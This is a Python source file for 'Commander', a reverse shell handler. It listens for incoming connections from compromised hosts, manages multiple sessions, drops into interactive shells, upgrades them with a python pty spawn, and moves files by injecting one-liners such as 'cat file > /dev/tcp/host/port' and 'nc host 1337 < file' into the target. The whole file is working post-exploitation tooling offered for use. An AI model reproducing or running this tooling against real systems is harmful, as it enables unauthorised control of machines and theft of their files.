#!/usr/bin/python3
import cmd
import socket
import signal
import threading
import time
import subprocess
import os
import readchar
import readline
import select
from shlex import split as args_split

HISTORY_FILE = '/opt/commander_history.txt'


class colors:
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'


def err(e, msg):
    print(f"{colors.FAIL}An error occured: " + str(e))
    print(f"{colors.WARNING}Usage: {msg}\n{colors.ENDC}")


def save_history(history_file):
    try:
        readline.set_history_length(5000)
        readline.write_history_file(history_file)
    except:
        print(f"{colors.WARNING}[!] Could not save history.{colors.ENDC}")


def ctrlc_handler(signum, frame):
    '''
    Handler function that catches Ctrl+C keyboard signal

    The function checks if any remote termianal is active and sends the kill signal
    (char \x03) through the socket.
    If no session is active, Ctrl+C works as intendend, kills the program on your host.
    '''

    if commander.in_shell == True and commander.current_session != 0:
        # Kill the remote program
        conn = connections[commander.current_session]
        conn.send(b'\x03\n')

    else:
        # Exit normally and save history
        try:
            msg = "\nCtrl+C was pressed. Do you really want to exit? y/n "
            print(msg, end="", flush=True)
            res = readchar.readchar()

            if res == 'y' or res == 'Y':
                print("")
                save_history(commander.global_history)
                quit()
            else:
                print(f"\n{commander.prompt}", end='')

        except KeyboardInterrupt:
            print(f"Ok\n{colors.FAIL}[!] Quitting{colors.ENDC}")
            quit()


def ctrlz_handler(signum, frame):
    '''
    Handler function that catches Ctrl+Z keyboard signal

    The function checks if any remote termianal is active and returns to the
    utility console.
    If no session is active, Ctrl+Z works as intendend, backgrounds the program
    on your host.
    '''

    if commander.in_shell:
        print(f"\n{colors.WARNING}[i] Interactive shell stopped. Connection still alive in background.{colors.ENDC}")
        commander.in_shell = False

        try:
            raise Exception
        except Exception:
            raise


class Commander(cmd.Cmd):
    '''
    The Commander class. Inherits from cmd.Cmd.
    Command-line functions are prepended by 'do_' pattern.
    '''

    intro = f"{colors.OKGREEN}Commander{colors.ENDC} v1.0\n"
    intro += f"Command line utility for managing reverse shell connections\n"
    prompt = "commander> "

    listeners_no = 0
    connections_no = 0
    histfile = ''
    histsize = 5000
    global_history = HISTORY_FILE
    current_session = 0
    in_shell = False
    transfers_no = 0
    port = 10000


    def emptyline(self):
        pass


    def default(self, line):
        '''
        Provide shortcuts for commands:
        l = listen
        s = sessions
        '''

        if ' ' in line:
            command, args = line.split(' ', 1)
        else:
            command = line
            args = ''
        if command == 'l':
            self.do_listen(args)
        elif command.startswith('li'):
            self.do_listeners(args)
        elif command == 's':
            self.do_sessions(args)
        elif command == 'r':
            self.do_run(args)


    def preloop(self):
        # Get the saved history before starting the console
        try:
            readline.read_history_file(commander.global_history)
        except:
            print(f"{colors.WARNING}[!] Could not get previous history.{colors.ENDC}")


    def postloop(self):
        # Save the history after quitting
        save_history(self.global_history)


    def precmd(self, line):
        'Runs before each console prompt.'
        print(self.connections_no)
        print(self.current_session)
        print(connections)
        print(connections_data)

        # make sure that the current selected session is still alive
        id = self.current_session
        if id != 0:
            if connections[id] == None:
                self.do_sessions('0')
                self.in_shell = False
                return ''

            can_read, can_write = Connection().is_available(connections[id])
            if can_write == 0:
                print(f"{colors.FAIL}[!] Cannot send bytes to socket. The connection may be dead.{colors.ENDC}")
                self.do_kill(str(id))
                self.do_sessions('0')
                self.in_shell = False
                return ''

        return line


    def do_exit(self, line):
        'Exit the console.'

        # Make sure to save history
        save_history(self.global_history)

        print(f"{colors.FAIL}[!] Quitting{colors.ENDC}")
        exit()


    def do_netstat(self, line):
        'Runs netstat on the local host.'
        subprocess.run(["netstat", "-tulpn"])


    def do_cwd(self, line):
        'Prints local current working directory.'
        print(os.getcwd())


    def do_lcd(self, line):
        'Change local current working directory: lcd /tmp'

        try:
            os.chdir(line)
        except Exception as e:
            err(e, "lcd <local directory>")
            return


    def do_run(self, line):
        'Run single command on local host.'

        try:
            args = line.split(" ")
            subprocess.run(args)
        except Exception as e:
            err(e, "run <system command>")
            return


    def do_history(self, line):
        'Set remote shell history file to keep track of commands ran on the target.\nUsage: history <path to histfile>'

        if self.current_session != 0:
            try:
                hist = ''

                if len(line) > 0:
                    if not line.startswith('/'):
                        hist = os.path.normpath(os.getcwd() + '/' + line)
                    else:
                        hist = os.path.normpath(line)

                self.histfile = hist
                connections_data[self.current_session]['History'] = hist

                if not os.path.exists(hist):
                    try:
                        open(hist, "x")
                    except Exception as e:
                        err(e, "history <file>")
                        return

                print(f"{colors.WARNING}[i] History file set to {self.histfile} and size {self.histsize}{colors.ENDC}")

            except Exception as e:
                err(e, "history <file>")
                return
        else:
            print(f"{colors.FAIL}[!] No session selected!{colors.ENDC}")
            return


    def do_upload(self, line):
        'Upload local file to target: upload <local file> <remote path>'

        if self.current_session == 0:
            print(f"{colors.FAIL}[!] No session selected!{colors.ENDC}")
            return

        # TODO: Add windows upload functionality
        if 'Windows' in connections_data[self.current_session]['OS']:
            print(f"{colors.WARNING}[-] Windows upload not implemented yet.{colors.ENDC}")
            return

        try:
            local_path, remote_path = args_split(line)
            f = open(local_path, 'rb')
        except Exception as e:
            err(e, "upload <local file> <remote path>")
            return

        data = f.read()

        self.port += 1
        self.transfers_no += 1
        transfer_index = self.transfers_no

        try:
            conn = connections[self.current_session]
            local_ip = str(conn).split('(')[1].split(')')[0].split('\'')[1]

            # These are the commands ran on the target in order to upload file
            command = f"nc {local_ip} 1337 > {remote_path} &"
            command = f"cat > {remote_path} < /dev/tcp/{local_ip}/{self.port} &"

            # Create a thread that listens on a specific port (on local machine)
            # Send a oneliner to the target that connects to the port and receives data
            threading.Thread(
                target=Connection().data_transfer_helper,
                args=(self.port, ),
                daemon=True,
                name=f"upload {self.transfers_no}"
            ).start()
            
            Connection().onecmd(conn, command)

            threading.Thread(
                target=Connection().transfer_data,
                args=(transfer_index, data, None, ),
                daemon=True
            ).start()

        except Exception as e:
            err(e, "upload <local file> <remote path>")
            return


    def do_download(self, line):
        'Download remote file: download <remote file> <local path>'

        if self.current_session == 0:
            print(f"{colors.FAIL}[!] No session selected!{colors.ENDC}")
            return

        # TODO: Add windows download functionality
        if 'Windows' in connections_data[self.current_session]['OS']:
            print(f"{colors.WARNING}[-] Windows upload not implemented yet.{colors.ENDC}")
            return

        try:
            remote_path, local_path = args_split(line)
            f = open(local_path, 'ab+')
        except Exception as e:
            err(e, "download <remote file> <local path>")
            return

        self.port += 1
        self.transfers_no += 1
        transfer_index = self.transfers_no

        try:
            conn = connections[self.current_session]
            local_ip = str(conn).split('(')[1].split(')')[0].split('\'')[1]

            # These are the commands ran on the target in order to download file
            command = f"nc {local_ip} 1337 < {remote_path} &"
            command = f"cat {remote_path} > /dev/tcp/{local_ip}/{self.port} &"

            # Create a thread that listens on a specific port (on local machine)
            # Send a oneliner to the target that connects to the port and sends data
            threading.Thread(
                target=Connection().data_transfer_helper,
                args=(self.port, ),
                daemon=True,
                name=f"download {self.transfers_no}"
            ).start()
            
            Connection().onecmd(conn, command)

            threading.Thread(
                target=Connection().transfer_data,
                args=(transfer_index, None, f, ),
                daemon=True
            ).start()

        except Exception as e:
            err(e, "download <remote file> <local path>")
            return


    def do_listeners(self, line):
        'Print all listening ports.'

        print(f"{colors.WARNING}[i] Active listeners:{colors.ENDC}")
        for thread in threading.enumerate(): 
            if "port" in thread.name:
                print(thread.name)


    def do_listen(self, line):
        'Listen on specified port.\nUsage: listen [ip:]<port_no>'

        try:
            if " " in line:
                ip, port = line.split(" ")
            else:
                port = line
                ip = "0.0.0.0"

            port = int(port)
            Connection().listen(ip, port)

        except Exception as e:
            err(e, "listen <ip> <port>")
            return

    
    def do_sessions(self, line):
        '''
        Swap between sessions and print information.
        '''
        if line:
            try:
                id = int(line)
                if id != 0 and id < len(connections) and connections[id] != None:
                    self.current_session = id
                    self.prompt = f"commander [{self.current_session}]> "
                    self.histfile = connections_data[id]['History']
                    self.do_upgrade('')

                else:
                    if id != 0:
                        print(f"{colors.FAIL}[!] No such session!{colors.ENDC}")
                    self.current_session = 0
                    self.prompt = "commander> "

            except Exception as e:
                err(e, "sessions [<session number>]")
                pass

        else:
            print(f"{colors.OKGREEN}[i] Opened connections:{colors.ENDC}")
            for i in range(1, len(connections)):
                if connections[i] != None:
                    self.connection_info('', i)


    def do_shell(self, line):
        'Enter a system shell on current session.'

        if self.current_session != 0:
            save_history(self.global_history)
            Connection().interact(connections[self.current_session])

        else:
            print(f"{colors.FAIL}[-] You must enter a session before getting shell!{colors.ENDC}")


    def connection_info(self, line, sess=0):
        'Print info about current session.'

        if self.current_session == 0 and sess == 0:
            print(f"{colors.FAIL}[!] No session selected!{colors.ENDC}")
            return

        if sess == 0:
            sess = self.current_session

        try:
            info = f"{colors.WARNING}  [i] Session {sess} info:{colors.ENDC}\n"
            info += f"{colors.OKCYAN}\t|session_number: {colors.ENDC}{connections_data[sess]['session_number']}\n"
            info += f"{colors.OKCYAN}\t|remote_addr: {colors.ENDC}{connections_data[sess]['remote_addr']}\n"
            info += f"{colors.OKCYAN}\t|local_addr: {colors.ENDC}{connections_data[sess]['local_addr']}\n"
            info += f"{colors.OKCYAN}\t|OS: {colors.ENDC}{connections_data[sess]['OS'].rstrip()}\n"
            print(info)
        except:
            pass


    def check_os(self, sess=0):
        'Check the OS of the target based on the return of uname/ver commands.'

        if sess == 0:
            return

        # TODO: Improve target OS detection
        try:
            res = Connection().onecmd(connections[sess], 'whoami')
            if '\\' in res:
                # Probably Windows
                res = Connection().onecmd(connections[sess], 'ver')
                if 'Windows' in res:
                    return res

            res = Connection().onecmd(connections[sess], 'uname -a')
            if res != None:
                return res
        except:
            print(f"{colors.FAIL}An error occured.{colors.ENDC}")
            return


    def do_upgrade(self, line):
        'Try to upgrade the connection to an interactive shell.\nWorks only for Linux hosts.'

        command = 'export TERM=xterm-256color; python3 -c \'import pty;pty.spawn("/bin/bash")\' '
        command += '|| python -c \'import pty;pty.spawn("/bin/bash")\''

        if self.current_session:
            if 'Windows' not in connections_data[self.current_session]['OS']:
                Connection().onecmd(connections[self.current_session], command)
            else:
                print(f"{colors.WARNING}[-] System is Windows. Cannot upgrade shell.{colors.ENDC}")
        else:
            print(f"{colors.FAIL}[!] No session selected to upgrade the shell.{colors.ENDC}")


    def do_kill(self, line):
        'Kill a session.'

        try:
            id = int(line)
        except Exception as e:
            err(e, "Kill a session: kill <session_id>")
            return

        if id != 0 and id < len(connections) and connections[id] != None:
            conn = connections[id]
            conn.close()
            connections[id] = None
            connections_data[id] = None

            print(f"{colors.WARNING}[+] Connection {id} no longer available.{colors.ENDC}")
            self.do_sessions('0')
        else:
            print(f"{colors.WARNING}[!] No such session.{colors.ENDC}")


connections = [
    None,
]

connections_data = [{
    'session_number': 0,
    'remote_addr': '',
    'local_addr': '',
    'OS': '',
    'History':'',
}]

transfers = [{
    'conn': None,
    'done': False,
}]


class Connection:
    ctrlc = False
    ctrlz = False

    def data_transfer_helper(self, port):
        '''
        Opens a socket and binds it to 0.0.0.0, then waits until it receives
        a connection. Closes the socket after the data transfer is done.
        '''
        index = commander.transfers_no

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', port))
        s.listen(1)

        conn, addr = s.accept()
        conn.settimeout(1)

        transfers.append({'conn': conn, 'done': False})

        while transfers[index]['done'] == False:
            time.sleep(1)
        conn.shutdown(2)
        conn.close()


    def transfer_data(self, transfer_index, data, f):
        '''
        Function that sends/receives data from a socket.
        Sets status as done after finishing the transfer.
        '''
        if data != None:
            transfers[transfer_index]['conn'].send(data)
            transfers[transfer_index]['done'] = True
            print(f"{colors.OKGREEN}[i] Done uploading!{colors.ENDC}")

        elif f != None:
            data = 'JUNK'
            while len(data) > 0:
                data = ''
                data = transfers[transfer_index]['conn'].recv(2048)
                f.write(data)

            transfers[transfer_index]['done'] = True
            print(f"{colors.OKGREEN}[i] Done downloading!{colors.ENDC}")


    def listen(self, ip, port):
        '''
        Opens a socket and binds it to ip:port in the background.
        Calls get_connection to start the listener and wait for a connection.
        '''
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((ip, port))

        commander.listeners_no += 1
        conn = None
        print(f"{colors.OKCYAN}[!] Listening on port {colors.OKBLUE}{colors.BOLD}{str(port)}{colors.ENDC}")

        thread = threading.Thread(
            target=self.get_connection,
            daemon=True,
            args=(s, conn,),
            name=f"{commander.listeners_no}: port {port}"
        )
        thread.start()


    def get_connection(self, s, conn):
        '''
        Listens to a specific socket.
        After receiving a connection, gets info about the target and saves it.
        '''
        s.listen(1)

        conn, addr = s.accept()
        addr_ip = addr[0]
        addr_port = addr[1]
        print(f"{colors.OKCYAN}\n[+] Received connection from {colors.FAIL}{colors.BOLD}{addr_ip}:{addr_port}{colors.ENDC}\n{commander.prompt}", end='')

        commander.connections_no += 1
        connections.append(conn)

        # Get information about the target
        os = commander.check_os(commander.connections_no)

        if 'closed' in str(conn):
            print(f"{colors.FAIL}\n[-] Connection did not open properly.{colors.ENDC}\n{commander.prompt}", end='')
            commander.connections_no -= 1
            connections.pop()
            return

        local_addr = str(conn).split('(')[1].split(')')[0]
        conn_data = {
            'session_number': commander.connections_no,
            'local_addr': local_addr,
            'remote_addr': str(conn).split('(')[2].split(')')[0],
            'OS': os,
            'History':'',
        }

        connections_data.append(conn_data)
        conn.settimeout(1)
        while 'raddr' in str(conn):
            time.sleep(1)

        print(f"{colors.FAIL}\n[-] Listener on {local_addr} stopped because client disconnected!{colors.ENDC}\n{commander.prompt}", end='')


    def interact(self, conn):
        '''
        Interacts with a connection that is opened in the background.
        Uses the specific history file of the saved session.
        '''
        commander.in_shell = True

        # Make sure to catch Ctrl+Z to stop interacting
        signal.signal(signal.SIGTSTP, ctrlz_handler)

        print(f"{colors.WARNING}[*] Entering shell. Careful what you execute!{colors.ENDC}")

        readline.clear_history()
        if os.path.exists(commander.histfile):
            readline.read_history_file(commander.histfile)
        else:
            print(f"{colors.WARNING}[i] History for this session not available!{colors.ENDC}")

        try:
            while True:
                ans = ''

                can_read, can_write = self.is_available(conn)
                if can_read != 0:
                    try:
                        ans = conn.recv(8192).decode()
                    except Exception:
                        print("Timed out!")
                    print(ans, end='')

                command = input()
                command += "\n"

                can_read, can_write = self.is_available(conn)
                if can_write != 0:
                    conn.send(command.encode())
                else:
                    print("Cannot send bytes to socket!")
                time.sleep(0.1)

        except Exception:
            if os.path.exists(commander.histfile):
                save_history(commander.histfile)

            readline.clear_history()
            readline.read_history_file(commander.global_history)
            return


    def onecmd(self, conn, command):
        '''
        Send only one command through the socket
        '''
        can_read, can_write = self.is_available(conn)
        if can_write == 0:
            print(f"{colors.FAIL}[-] Error while sending one command. The connection may be dead.{colors.ENDC}")
            return None

        command += "\n"
        conn.send(command.encode())
        time.sleep(0.2)

        can_read, can_write = self.is_available(conn)
        if can_read == 0:
            return None

        try:
            res = conn.recv(1024).decode()
        except Exception:
            return None

        return res


    def is_available(self, conn):
        '''
        Checks if the connection is still available.
        Returns a tuple that designates if stdout/stdin are alive.
        '''
        can_read = 0
        can_write = 0
        conn_index = connections.index(conn)

        # TODO: Improve broken pipe detection
        try:
            if 'raddr' not in str(conn):
                commander.do_kill(str(conn_index))
                return 0, 0
        except:
            pass

        try:
            ready_to_read, ready_to_write, in_error = select.select([conn,], [conn,], [conn,], 5)
        except select.error as e:
            # 0 = done receiving, 1 = done sending, 2 = both
            conn.shutdown(2)
            conn.close()

            connections[conn_index] = None
            connections_data[conn_index] = None
            commander.in_shell = False
            print(f"{colors.FAIL}[!] Connection error:{colors.ENDC} {e}")
            commander.do_sessions('0')

        if len(ready_to_read) > 0:
            can_read = 1
        if len(ready_to_write) > 0:
            can_write = 1

        return can_read, can_write


if __name__ == "__main__":
    signal.signal(signal.SIGINT, ctrlc_handler)

    # Run the console
    commander = Commander()
    commander.cmdloop()